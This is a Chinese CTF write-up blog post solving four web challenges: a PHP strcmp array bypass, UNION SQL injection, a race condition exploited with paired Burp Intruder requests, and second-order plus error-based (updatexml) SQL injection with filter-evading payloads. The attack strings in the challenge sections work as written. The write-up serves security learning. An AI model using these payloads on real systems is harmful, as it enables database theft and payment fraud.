---
title: 中计量现科CTF竞赛
date: 2020-06-21
image: 
description: 由中国计量大学现代科技学院主办的比赛。
categories: 
- ctf_writeup
tags:
- 二次注入
- 条件竞争
---


------

### easyweb

源码忘了脱下来，大概考察PHP strcmp()函数，直接数组绕过

```
?password[]=shit
```

 

 

 

### 成绩单

白给题，Union注入无任何过滤，上来直接一血

```
id=-1' union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()#
//fl4g,sc
id=-1' union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name='fl4g'#
//flag
id=-1' union select 1,flag,3,4 from fl4g#
//flag{Sql_INJECT0N_4813drd8hz4}
```

 

 

 

 

### shop

考点：条件竞争

说实话一开始以为是逻辑漏洞，尝试了半天没搞出来，想到了条件竞争但是因为爆破的时候线程设置的不够高，所以没搞出来，时候来又尝试了一次才想到。

#### 什么是条件竞争

参考：https://www.jianshu.com/p/09d0eb938e6a


竞争条件发生在多个线程同时访问同一个共享代码、变量、文件等没有进行锁操作或者同步操作的场景中。

开发者在进行代码开发时常常倾向于认为代码会以线性的方式执行，而且他们忽视了并行服务器会并发执行多个线程，这就会导致意想不到的结果。

线程同步机制确保两个及以上的并发进程或线程不同时执行某些特定的程序段，也被称之为临界区（critical section），如果没有应用好同步技术则会发生“竞争条件”问题。



#### 两个例子

##### 例1：金额提现

假设现有一个用户在系统中共有2000元可以提现，他想全部提现。于是该用户同时发起两次提现请求，第一次提交请求提现2000元，系统已经创建了提现订单但还未来得及修改该用户剩余金额，此时第二次提现请求同样是提现2000元，于是程序在还未修改完上一次请求后的余额前就进行了余额判断，显然如果这里余额判断速度快于上一次余额修改速度，将会产生成功提现的两次订单，而数据库中余额也将变为-2000。而这产生的后果将会是平台多向该用户付出2000元。

 

##### 例2：先存储文件，再判断是否合法，然后再删除。

首先将文件上传到服务器，然后检测文件后缀名，如果不符合条件，就删掉，典型的“引狼入室”

攻击：首先上传一个php文件

当然这个文件会被立马删掉，所以我们使用多线程并发的访问上传的文件，总会有一次在上传文件到删除文件这个时间段内访问到上传的php文件，一旦我们成功访问到了上传的文件，那么它就会向服务器写一个shell。

#### 回到题目

打开题目，显示账户剩余20元，flag需要21元，然后你可以输入小于等于20元的金额，另外有个重置按钮

思路就是分别抓两个包，一个不停的支付20元，一个不停的重置，在高并发的情况下服务器响应不过来就可以造成支付两次

注意事项就是支付金额最好是10元以上，如果是一两元的话，就不能和另外一个包形成竞争还有就是线程要多

```
POST / HTTP/1.1
Host: aaaed42d.yunyansec.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/§72§.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 16
Origin: http://aaaed42d.yunyansec.com
Connection: close
Referer: http://aaaed42d.yunyansec.com/
Upgrade-Insecure-Requests: 1
 
money=20&submit=
POST / HTTP/1.1
Host: aaaed42d.yunyansec.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/§72§.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 16
Origin: http://aaaed42d.yunyansec.com
Connection: close
Referer: http://aaaed42d.yunyansec.com/
Upgrade-Insecure-Requests: 1
 
money=&restart=1
```

开两个intruder，线程20，爆破出flag

![img](https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120171516.png)

 

 

### easy

考点：二次注入

打开就一个注册登录界面，admin账户已经注册了，登录之后可以改密码，本来以为是越权，后来放出了hint是二次注入，以前对于这样的二次注入比较陌生，感觉此题还是有点意思

 

#### 利用注册用户名进行sqli

注册这里没有sqli，在改密码那里才可以触发，盲猜查询语句：

```
update XXX set password = "xxx" where username = "xxx" and (old)password = "xx";
```

hint提示了注入之后，在注册用户名那里，注册：

```
admin"#
```

登录进去之后，修改密码为123456，改完之后我们可以直接123456登录admin的账户了，说明我们已经注入成功了

但是到这里一筹莫展，后来才想到可以继续利用sqli查信息

 

#### 利用报错注入查信息

简单fuzz了一下，空格，/**/这些被过滤了，update不知道能不能union，我直接想到报错注入+括号套娃

```
test"||updatexml(2,concat(0x7e,(database())),0)#
//easy
abc"||updatexml(2,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)='easy')),0)#
//article,flag,user
abc"||updatexml(2,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)='flag')),0)#
//flag
abc"||updatexml(2,concat(0x7e,(select(flag)from(flag))),0)#
//flag{We11D0Ne_hOhO}
```

![img](https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120171534.png)

其实主要就是这个二次注入比较难想到，学到许多